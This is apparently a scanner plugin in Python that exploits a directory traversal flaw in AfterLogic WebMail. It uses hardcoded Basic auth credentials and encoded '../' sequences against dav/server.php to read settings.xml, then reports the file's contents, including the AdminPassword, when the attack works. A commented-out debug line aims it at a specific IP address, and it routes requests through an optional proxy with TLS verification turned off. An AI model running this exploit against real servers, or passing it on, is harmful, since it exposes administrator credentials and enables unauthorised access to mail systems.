import requests
import re
from bs4 import BeautifulSoup
import logging

uia = ''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie=None):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        #-------------------------------以下可修改
        headers = {
            'Authorization': 'Basic Y2FsZGF2X3B1YmxpY191c2VyQGxvY2FsaG9zdDpjYWxkYXZfcHVibGljX3VzZXI=',
            'Accept': '*/*',
            'Connection': 'close',
        }
        gf = requests.get(url+"dav/server.php/files/personal/%2e%2e/%2e%2e//%2e%2e//%2e%2e/data/settings/settings.xml",cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        if 'AdminPassword' in gf.text:
            uia = "[+]漏洞存在\ndav/server.php/files/personal/%2e%2e/%2e%2e//%2e%2e//%2e%2e/data/settings/settings.xml\n"+gf.text
        else:
            uia='[-]漏洞不存在'
        # -------------------------------
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
#----------------调试
# ty('https://58.63.47.210:14430/')
# print(uia)
#----------------
def yt1():
    global uia
    return '--------------------------------------------------\n[ AfterLogic WebMail 目录遍历漏洞 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)